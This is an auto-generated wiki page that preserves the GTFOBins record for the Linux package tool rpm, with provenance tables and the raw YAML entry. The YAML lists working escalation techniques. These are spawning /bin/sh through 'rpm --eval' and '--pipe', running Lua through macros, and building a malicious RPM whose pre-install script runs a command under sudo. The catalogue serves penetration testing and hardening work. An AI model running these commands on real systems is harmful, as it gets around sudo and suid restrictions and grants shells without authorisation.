---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rpm

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rpm` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpm` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rpm](../../tools/linux/rpm.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rpm |
| name | rpm |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rpm/ |

## Preserved Source Material

````yaml
_body: ''
_name: rpm
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpm
functions:
  command:
  - code: rpm -ivh x-1.0-1.noarch.rpm
    comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.


      ```

      echo /path/to/command >x.sh

      fpm -n x -s dir -t rpm -a all --before-install x.sh .

      ```'
    contexts:
      sudo: null
  inherit:
  - code: rpm --eval '%{lua:...}'
    comment: This allows to run Lua code (`...`).
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: lua
    version: Some older version is required.
  shell:
  - code: rpm --eval '%(/bin/sh 1>&2)'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  - code: rpm --pipe '/bin/sh 0<&1'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
````
